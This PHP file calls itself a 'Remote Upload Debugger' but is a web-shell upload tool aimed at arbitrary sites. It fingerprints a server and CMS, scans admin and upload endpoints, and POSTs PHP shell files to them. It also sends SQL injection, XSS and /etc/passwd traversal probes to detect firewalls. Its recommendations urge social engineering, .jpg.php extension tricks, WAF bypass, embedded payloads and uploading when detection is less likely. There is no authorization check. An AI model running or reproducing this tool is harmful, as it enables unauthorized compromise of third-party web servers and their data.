<?php
// Debug Remote Upload - Comprehensive Failure Analysis
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

class RemoteUploadDebugger {
    private $targetUrl;
    private $timeout = 30;
    private $debugLog = [];
    
    public function __construct($targetUrl) {
        $this->targetUrl = rtrim($targetUrl, '/');
    }
    
    public function fullDiagnostics($shellFile = null, $shellName = 'test.php') {
        $this->log('🔍 STARTING COMPREHENSIVE DIAGNOSTICS', 'info');
        $this->log("🎯 Target: {$this->targetUrl}", 'info');
        
        $results = [
            'target_url' => $this->targetUrl,
            'timestamp' => date('Y-m-d H:i:s'),
            'diagnostics' => []
        ];
        
        // Phase 1: Basic connectivity
        $results['diagnostics']['connectivity'] = $this->testConnectivity();
        
        // Phase 2: SSL/TLS testing
        $results['diagnostics']['ssl'] = $this->testSSL();
        
        // Phase 3: Server analysis
        $results['diagnostics']['server'] = $this->analyzeServer();
        
        // Phase 4: Endpoint discovery
        $results['diagnostics']['endpoints'] = $this->discoverEndpoints();
        
        // Phase 5: Upload testing (if file provided)
        if ($shellFile) {
            $results['diagnostics']['upload_tests'] = $this->testAllUploadMethods($shellFile, $shellName);
        }
        
        // Phase 6: Security analysis
        $results['diagnostics']['security'] = $this->analyzeSecurityMeasures();
        
        $results['debug_log'] = $this->debugLog;
        $results['recommendations'] = $this->generateRecommendations($results['diagnostics']);
        
        return $results;
    }
    
    private function testConnectivity() {
        $this->log('📡 Testing basic connectivity...', 'info');
        
        $connectivity = [
            'ping_test' => false,
            'http_response' => null,
            'response_time' => 0,
            'can_resolve_dns' => false,
            'error_details' => []
        ];
        
        // DNS resolution test
        $host = parse_url($this->targetUrl, PHP_URL_HOST);
        $ip = gethostbyname($host);
        $connectivity['can_resolve_dns'] = ($ip !== $host);
        $connectivity['resolved_ip'] = $ip;
        
        $this->log("🌐 DNS: {$host} → {$ip}", $connectivity['can_resolve_dns'] ? 'success' : 'error');
        
        // HTTP connectivity test
        $startTime = microtime(true);
        $response = $this->makeRequest($this->targetUrl, 'GET');
        $connectivity['response_time'] = round((microtime(true) - $startTime) * 1000, 2);
        
        if ($response['success']) {
            $connectivity['ping_test'] = true;
            $connectivity['http_response'] = $response['http_code'];
            $this->log("✅ HTTP Response: {$response['http_code']} ({$connectivity['response_time']}ms)", 'success');
        } else {
            $connectivity['error_details'][] = $response['error'] ?? 'Unknown connection error';
            $this->log("❌ Connection failed: " . ($response['error'] ?? 'Unknown'), 'error');
        }
        
        return $connectivity;
    }
    
    private function testSSL() {
        $this->log('🔒 Testing SSL/TLS configuration...', 'info');
        
        $ssl = [
            'is_https' => false,
            'ssl_valid' => false,
            'ssl_info' => [],
            'certificate_details' => []
        ];
        
        if (strpos($this->targetUrl, 'https://') === 0) {
            $ssl['is_https'] = true;
            
            // Test SSL certificate
            $host = parse_url($this->targetUrl, PHP_URL_HOST);
            $port = parse_url($this->targetUrl, PHP_URL_PORT) ?: 443;
            
            $context = stream_context_create([
                'ssl' => [
                    'capture_peer_cert' => true,
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            
            $socket = @stream_socket_client(
                "ssl://{$host}:{$port}",
                $errno,
                $errstr,
                10,
                STREAM_CLIENT_CONNECT,
                $context
            );
            
            if ($socket) {
                $ssl['ssl_valid'] = true;
                $cert = stream_context_get_params($socket)['options']['ssl']['peer_certificate'];
                if ($cert) {
                    $certInfo = openssl_x509_parse($cert);
                    $ssl['certificate_details'] = [
                        'subject' => $certInfo['subject']['CN'] ?? 'Unknown',
                        'issuer' => $certInfo['issuer']['CN'] ?? 'Unknown',
                        'valid_from' => date('Y-m-d', $certInfo['validFrom_time_t']),
                        'valid_to' => date('Y-m-d', $certInfo['validTo_time_t'])
                    ];
                }
                fclose($socket);
                $this->log("✅ SSL certificate valid", 'success');
            } else {
                $ssl['ssl_info']['error'] = "SSL connection failed: {$errstr}";
                $this->log("❌ SSL connection failed: {$errstr}", 'error');
            }
        } else {
            $this->log("ℹ️ HTTP (non-SSL) connection", 'info');
        }
        
        return $ssl;
    }
    
    private function analyzeServer() {
        $this->log('🖥️ Analyzing server configuration...', 'info');
        
        $server = [
            'server_software' => 'Unknown',
            'powered_by' => 'Unknown',
            'cms_detected' => 'Unknown',
            'php_version' => 'Unknown',
            'response_headers' => [],
            'security_headers' => []
        ];
        
        $response = $this->makeRequest($this->targetUrl, 'GET', [], true);
        
        if ($response['success'] && isset($response['headers'])) {
            $headers = $response['headers'];
            $server['response_headers'] = $headers;
            
            // Extract server info
            foreach ($headers as $header) {
                if (stripos($header, 'Server:') === 0) {
                    $server['server_software'] = trim(substr($header, 7));
                    $this->log("🖥️ Server: {$server['server_software']}", 'info');
                }
                if (stripos($header, 'X-Powered-By:') === 0) {
                    $server['powered_by'] = trim(substr($header, 13));
                    $this->log("⚡ Powered by: {$server['powered_by']}", 'info');
                }
                
                // Security headers
                if (stripos($header, 'X-Frame-Options:') === 0 ||
                    stripos($header, 'X-Content-Type-Options:') === 0 ||
                    stripos($header, 'X-XSS-Protection:') === 0 ||
                    stripos($header, 'Content-Security-Policy:') === 0) {
                    $server['security_headers'][] = $header;
                }
            }
            
            // CMS detection from content
            if (isset($response['body'])) {
                $content = $response['body'];
                if (strpos($content, '/wp-content/') !== false) {
                    $server['cms_detected'] = 'WordPress';
                } elseif (strpos($content, '/sites/default/') !== false) {
                    $server['cms_detected'] = 'Drupal';
                } elseif (strpos($content, '/media/jui/') !== false) {
                    $server['cms_detected'] = 'Joomla';
                } elseif (strpos($content, '/sources/') !== false) {
                    $server['cms_detected'] = 'Custom Vietnamese CMS';
                }
                $this->log("🎯 CMS: {$server['cms_detected']}", 'info');
            }
        }
        
        return $server;
    }
    
    private function discoverEndpoints() {
        $this->log('🔍 Discovering upload endpoints...', 'info');
        
        $endpoints = [
            'discovered' => [],
            'tested' => [],
            'accessible' => [],
            'upload_forms' => []
        ];
        
        // Common endpoints to test
        $testEndpoints = [
            '/admin/',
            '/wp-admin/',
            '/administrator/',
            '/admin/index.php',
            '/admin/upload.php',
            '/admin/filemanager/',
            '/admin/filemanager/upload.php',
            '/wp-admin/admin-ajax.php',
            '/wp-admin/async-upload.php',
            '/upload.php',
            '/fileupload.php',
            '/uploader.php',
            '/contact.php',
            '/contact-form.php'
        ];
        
        foreach ($testEndpoints as $endpoint) {
            $fullUrl = $this->targetUrl . $endpoint;
            $endpoints['tested'][] = $endpoint;
            
            $response = $this->makeRequest($fullUrl, 'GET');
            
            if ($response['success'] && $response['http_code'] < 400) {
                $endpoints['accessible'][] = $endpoint;
                $this->log("✅ Found: {$endpoint} (HTTP {$response['http_code']})", 'success');
                
                // Check for upload forms
                if (isset($response['body']) && 
                    (strpos($response['body'], 'type="file"') !== false ||
                     strpos($response['body'], 'enctype="multipart/form-data"') !== false)) {
                    $endpoints['upload_forms'][] = $endpoint;
                    $this->log("📤 Upload form detected: {$endpoint}", 'warning');
                }
            } elseif ($response['http_code'] == 403) {
                $this->log("🔒 Forbidden: {$endpoint}", 'warning');
            } elseif ($response['http_code'] == 404) {
                $this->log("❌ Not found: {$endpoint}", 'info');
            } else {
                $this->log("❓ Unexpected response: {$endpoint} (HTTP {$response['http_code']})", 'warning');
            }
            
            // Small delay to avoid being blocked
            usleep(500000); // 0.5 seconds
        }
        
        return $endpoints;
    }
    
    private function testAllUploadMethods($shellFile, $shellName) {
        $this->log('🚀 Testing all upload methods...', 'info');
        
        $uploadTests = [
            'methods_attempted' => [],
            'detailed_results' => [],
            'curl_errors' => [],
            'http_responses' => []
        ];
        
        $methods = [
            'admin_filemanager' => ['/admin/upload.php', '/admin/filemanager/upload.php'],
            'wp_media_upload' => ['/wp-admin/async-upload.php', '/wp-admin/admin-ajax.php'],
            'contact_form' => ['/contact.php', '/contact-form.php'],
            'direct_upload' => ['/upload.php', '/fileupload.php', '/uploader.php'],
            'directory_upload' => ['/uploads/upload.php', '/files/upload.php']
        ];
        
        foreach ($methods as $methodName => $urls) {
            $uploadTests['methods_attempted'][] = $methodName;
            $this->log("🔧 Testing method: {$methodName}", 'info');
            
            foreach ($urls as $url) {
                $fullUrl = $this->targetUrl . $url;
                $result = $this->attemptFileUpload($fullUrl, $shellFile, $shellName, $methodName);
                
                $uploadTests['detailed_results'][] = [
                    'method' => $methodName,
                    'url' => $url,
                    'result' => $result
                ];
                
                if (!$result['success']) {
                    if (isset($result['curl_error'])) {
                        $uploadTests['curl_errors'][] = $result['curl_error'];
                    }
                    $uploadTests['http_responses'][] = [
                        'url' => $url,
                        'http_code' => $result['http_code'] ?? 0,
                        'response' => substr($result['response'] ?? '', 0, 200)
                    ];
                }
            }
        }
        
        return $uploadTests;
    }
    
    private function attemptFileUpload($url, $shellFile, $shellName, $method) {
        $this->log("📤 Attempting upload to: {$url}", 'info');
        
        // Create temporary file for testing
        $tempFile = tempnam(sys_get_temp_dir(), 'shell_test');
        $testContent = "<?php echo 'Test shell - " . date('Y-m-d H:i:s') . "'; ?>";
        file_put_contents($tempFile, $testContent);
        
        $postData = [
            'file' => new CURLFile($tempFile, 'application/x-httpd-php', $shellName),
            'upload' => new CURLFile($tempFile, 'application/x-httpd-php', $shellName),
            'userfile' => new CURLFile($tempFile, 'application/x-httpd-php', $shellName),
            'attachment' => new CURLFile($tempFile, 'application/x-httpd-php', $shellName)
        ];
        
        // Method-specific parameters
        switch ($method) {
            case 'wp_media_upload':
                $postData['action'] = 'upload-attachment';
                $postData['post_id'] = '0';
                break;
            case 'contact_form':
                $postData['name'] = 'Test User';
                $postData['email'] = 'test@example.com';
                $postData['message'] = 'Test message';
                break;
        }
        
        $result = $this->makeRequest($url, 'POST', $postData);
        
        // Cleanup
        unlink($tempFile);
        
        if ($result['success']) {
            $this->log("✅ Upload attempt completed (HTTP {$result['http_code']})", 'success');
        } else {
            $this->log("❌ Upload failed: " . ($result['error'] ?? 'Unknown error'), 'error');
        }
        
        return $result;
    }
    
    private function analyzeSecurityMeasures() {
        $this->log('🛡️ Analyzing security measures...', 'info');
        
        $security = [
            'waf_detected' => false,
            'rate_limiting' => false,
            'csrf_protection' => false,
            'upload_restrictions' => [],
            'blocked_requests' => []
        ];
        
        // Test for WAF
        $maliciousRequests = [
            'sql_injection' => $this->targetUrl . "?id=1' OR '1'='1",
            'xss_attempt' => $this->targetUrl . "?search=<script>alert('xss')</script>",
            'path_traversal' => $this->targetUrl . "?file=../../../etc/passwd"
        ];
        
        foreach ($maliciousRequests as $type => $url) {
            $response = $this->makeRequest($url, 'GET');
            
            if ($response['success'] && isset($response['body'])) {
                $body = strtolower($response['body']);
                if (strpos($body, 'blocked') !== false ||
                    strpos($body, 'forbidden') !== false ||
                    strpos($body, 'security') !== false ||
                    strpos($body, 'firewall') !== false) {
                    $security['waf_detected'] = true;
                    $security['blocked_requests'][] = $type;
                    $this->log("🛡️ WAF detected on {$type}", 'warning');
                }
            }
        }
        
        return $security;
    }
    
    private function makeRequest($url, $method = 'GET', $postData = [], $includeHeaders = false) {
        $ch = curl_init();
        
        $curlOptions = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1'
            ]
        ];
        
        if ($includeHeaders) {
            $curlOptions[CURLOPT_HEADER] = true;
        }
        
        if ($method === 'POST' && !empty($postData)) {
            $curlOptions[CURLOPT_POST] = true;
            $curlOptions[CURLOPT_POSTFIELDS] = $postData;
        }
        
        curl_setopt_array($ch, $curlOptions);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        
        $result = [
            'success' => ($response !== false && empty($error)),
            'http_code' => $httpCode,
            'response' => $response,
            'error' => $error,
            'curl_info' => $info
        ];
        
        if ($includeHeaders && $result['success']) {
            $headerSize = $info['header_size'];
            $headers = substr($response, 0, $headerSize);
            $body = substr($response, $headerSize);
            
            $result['headers'] = explode("\r\n", $headers);
            $result['body'] = $body;
        }
        
        return $result;
    }
    
    private function generateRecommendations($diagnostics) {
        $recommendations = [
            'immediate_actions' => [],
            'alternative_methods' => [],
            'manual_steps' => []
        ];
        
        // Connectivity issues
        if (!$diagnostics['connectivity']['ping_test']) {
            $recommendations['immediate_actions'][] = 'Check network connectivity and DNS resolution';
            $recommendations['immediate_actions'][] = 'Verify target URL is correct and accessible';
        }
        
        // SSL issues
        if ($diagnostics['ssl']['is_https'] && !$diagnostics['ssl']['ssl_valid']) {
            $recommendations['immediate_actions'][] = 'SSL certificate issues detected - try HTTP if available';
        }
        
        // No accessible endpoints
        if (empty($diagnostics['endpoints']['accessible'])) {
            $recommendations['alternative_methods'][] = 'Try social engineering to get admin access';
            $recommendations['alternative_methods'][] = 'Look for backup/alternative admin panels';
            $recommendations['manual_steps'][] = 'Contact website owner for authorized testing';
        }
        
        // Upload forms found but upload failed
        if (!empty($diagnostics['endpoints']['upload_forms']) && 
            isset($diagnostics['upload_tests']) && 
            empty(array_filter($diagnostics['upload_tests']['detailed_results'], function($r) { return $r['result']['success']; }))) {
            $recommendations['alternative_methods'][] = 'Try different file extensions (.txt, .jpg.php, .phtml)';
            $recommendations['alternative_methods'][] = 'Use social engineering with valid-looking files';
            $recommendations['alternative_methods'][] = 'Try during low-traffic periods to avoid detection';
        }
        
        // WAF detected
        if ($diagnostics['security']['waf_detected']) {
            $recommendations['alternative_methods'][] = 'Use WAF bypass techniques (encoding, fragmentation)';
            $recommendations['alternative_methods'][] = 'Try uploading during maintenance windows';
            $recommendations['alternative_methods'][] = 'Use legitimate file types with embedded payloads';
        }
        
        return $recommendations;
    }
    
    private function log($message, $type = 'info') {
        $this->debugLog[] = [
            'timestamp' => date('H:i:s'),
            'type' => $type,
            'message' => $message
        ];
    }
}

// Main execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Clean any previous output
    ob_clean();
    
    try {
        $targetUrl = $_POST['target_url'] ?? '';
        $action = $_POST['action'] ?? 'full_diagnostics';
        
        if (empty($targetUrl)) {
            throw new Exception('Target URL is required');
        }
        
        $debugger = new RemoteUploadDebugger($targetUrl);
        
        switch ($action) {
            case 'full_diagnostics':
                $shellFile = $_FILES['shell_file'] ?? null;
                $shellName = $_POST['shell_name'] ?? 'test.php';
                $result = $debugger->fullDiagnostics($shellFile, $shellName);
                break;
                
            default:
                throw new Exception('Unknown action');
        }
        
        // Ensure clean JSON output
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
        
    } catch (Exception $e) {
        ob_clean();
        http_response_code(500);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode([
            'success' => false,
            'error' => true,
            'message' => $e->getMessage(),
            'timestamp' => date('Y-m-d H:i:s')
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
} else {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'message' => 'Remote Upload Debugger API',
        'description' => 'Comprehensive diagnostics for failed remote uploads',
        'usage' => 'POST with target_url and optional shell_file',
        'status' => 'ready',
        'version' => '2.0'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?> 